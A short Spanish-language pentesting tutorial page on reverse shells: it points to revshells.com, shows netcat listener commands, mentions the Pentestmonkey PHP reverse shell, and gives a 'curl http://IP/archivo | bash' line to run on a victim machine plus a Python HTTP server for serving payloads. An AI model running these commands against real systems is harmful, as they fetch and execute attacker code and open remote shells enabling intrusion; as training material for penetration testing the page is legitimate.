---
icon: '2'
---

# Conceptos Básicos de Hacking

## Uso de Netcat para entablar una Reverse Shell

La página **revshells.com** es una herramienta en línea que permite generar fácilmente comandos para establecer **Reverse Shells**. Solo debes ingresar la dirección IP de la máquina atacante y el puerto, y seleccionar el tipo de shell y el sistema operativo. También ofrece opciones avanzadas como diferentes tipos de listeners y codificación. Es útil para realizar pruebas de penetración o auditorías de seguridad.

Puedes acceder a la página aquí: [revshells.com](https://www.revshells.com/).

1. Poner el comando adecuado para la **Reverse Shell** en la máquina víctima.
2. &#x20;Nos ponemos en escucha a través del **puerto** de la Reverse Shell que hayamos puesto.

```bash
nc -lvnp <puerto>
```

### PHP Reverse Shell

Un sencillo shell reverso en PHP desarrollado por [Pentestmonkey](http://pentestmonkey.net).

Este es un shell reverso simple en PHP que puede utilizarse durante pruebas de penetración para obtener acceso a un servidor objetivo.

## Cómo Compartir Archivos Con Servidor Http Con Python + Reverse Shell

1. Crear un archivo que sea un **payload**.
2. Ejecutamos el comando en la máquina atacante a escuchar&#x20;

```bash
sudo nc -nlvp <puerto>
```

3. En la máquina víctima hacemos el siguiente comando

```bash
curl http://IP/archivo | bash
```

## Compartir Archivos por la Red en Máquinas Windows

Si no tenemos acceso a curl o a wget hay otra herramienta que es CertUtil.

1. Crear archivo.
2. En la máquina atacante poner este comando

```bash
python3 -m http.server 80
```
